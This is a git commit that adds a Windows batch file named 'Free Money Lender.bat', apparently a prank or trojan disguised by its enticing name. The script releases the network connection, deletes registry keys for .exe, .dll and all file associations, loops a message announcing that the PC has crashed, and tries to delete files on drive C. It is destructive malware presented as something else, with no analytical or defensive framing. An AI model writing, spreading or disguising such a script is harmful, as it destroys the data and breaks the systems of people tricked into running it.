3e1c8d1b2e0c9cdbf3b3069a9146e21248e2c7d9
SNV-008 <95419810+SNV-008@users.noreply.github.com>
2021-12-03 18:55:27 +0530

    Add files via upload

---
+++ Free Money Lender.bat
@@ -0,0 +1,9 @@
+@Echo off
+Ipconfig /release
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+:MESSAGE
+ECHO Your PC has been crashed.Your Dad.
+GOTO MESSAGE
+Del C: *.* |y
